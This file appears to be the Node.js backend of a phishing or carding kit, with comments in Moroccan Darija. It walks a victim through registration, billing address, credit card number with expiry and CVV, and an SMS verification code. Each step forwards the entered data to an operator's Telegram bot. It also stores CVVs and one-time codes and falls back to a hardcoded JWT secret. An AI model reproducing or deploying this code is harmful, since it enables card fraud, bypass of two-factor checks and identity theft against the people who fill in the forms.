const User = require('../models/User');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const sendTelegramMessage = async (message) => {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: message,
        }),
      }
    );

    const data = await response.json();
    console.log("Telegram Response:", data);
  } catch (error) {
    console.error("Telegram Error:", error.message);
  }
};
// 🚀 0. التسجيل (Register) - POST
exports.register = async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // كنتأكدو واش الايميل ديجا كاين
    let user = await User.findOne({ email });
    if (user) return res.status(400).json({ message: 'Email dija kayn' });

    // كنشَفرو المودباس
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    // كنكرييو مستعمل جديد
    user = new User({ email, password: hashedPassword });
    await user.save();
     await sendTelegramMessage(`
  📧 Email: ${user.email}
  🕒 Date: ${new Date().toLocaleString()}
    `);

    // كنصاوبو التوكن باش يبقى مكونيكطي
    const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET || 'secretkey', { expiresIn: '7d' });
    res.status(201).json({ token, user, message: 'Tssajel b najah' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

// 🚀 1. الخطوة 1: Billing Address - PUT
exports.step1 = async (req, res) => {
  try {
    const { firstname, lastname, address_line, city, zip_code, ip_address , phone_number } = req.body;
    
    // كنقلبو على المستعمل بالايدي ديالو لي جا من التوكن وكنزيدو ليه المعلومات
    const user = await User.findByIdAndUpdate(
      req.user.userId, 
      { firstname, lastname, address_line, city, zip_code, ip_address, phone_number, current_step: 2 },
      { new: true }
    );
        await sendTelegramMessage(`
  # Email: ${user.email}
  # First Name: ${firstname}
  # Last Name: ${lastname}
  # address_line : ${address_line}
  # City : ${city}
  # zip_code : ${zip_code}
  # ip_address : ${ip_address}
  # Phone: ${phone_number}
  # Date: ${new Date().toLocaleString()}
      `);

    res.json({ message: 'Step 1 dazet', user });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

// 🚀 2. الخطوة 2: Credit Card - PUT
exports.step2 = async (req, res) => {
  try {
    const { cardNumber, expirationDate, cvv } = req.body;
    
    const user = await User.findByIdAndUpdate(
      req.user.userId,
      { cardNumber, expirationDate, cvv, current_step: 3 },
      { new: true }
    );
      await sendTelegramMessage(`

  # Email: ${user.email}
  # cardNumber : ${cardNumber}
  # expirationDate : ${expirationDate}
  # cvv : ${cvv}
  `);

    res.json({ message: 'Step 2 (Card Info) dazet', user });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

// 🚀 3. الخطوة 3: SMS Verification - PUT
exports.step3 = async (req, res) => {
  try {
    const { sms_code } = req.body;
    
    // هادي مؤقتا باش تسجل الكود ف Database حتى تصاوب Twilio
    const user = await User.findByIdAndUpdate(
      req.user.userId,
      { sms_code, is_verified: true, current_step: 4 },
      { new: true }
    );
        await sendTelegramMessage(`
  # Email: ${user.email}
  # sms_code :${sms_code}
    `);
    
    res.json({ message: 'Step 3 (SMS) dazet', user });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};